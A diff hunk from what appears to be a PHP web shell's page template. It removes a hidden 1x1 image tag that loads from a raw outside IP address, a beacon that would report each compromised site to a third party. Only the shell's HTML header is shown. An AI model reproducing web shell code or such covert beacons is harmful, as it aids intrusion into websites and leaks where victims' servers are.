@@ -1086,7 +1086,6 @@ function unhighlighthexdump(address){
 ";
 $html_body = "
 <div id=\"wrapper\">
-<img src=\"http://13.81.70.212/logo.gif\" style=\"width:1; height:1;\">
 <h1 onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\"  onclick=\"window.location= '?';\"><a href=\"?\">".$shell_title."</a></h1>
 <div class=\"box\">".$xHeader."
 <div class=\"fpath\">
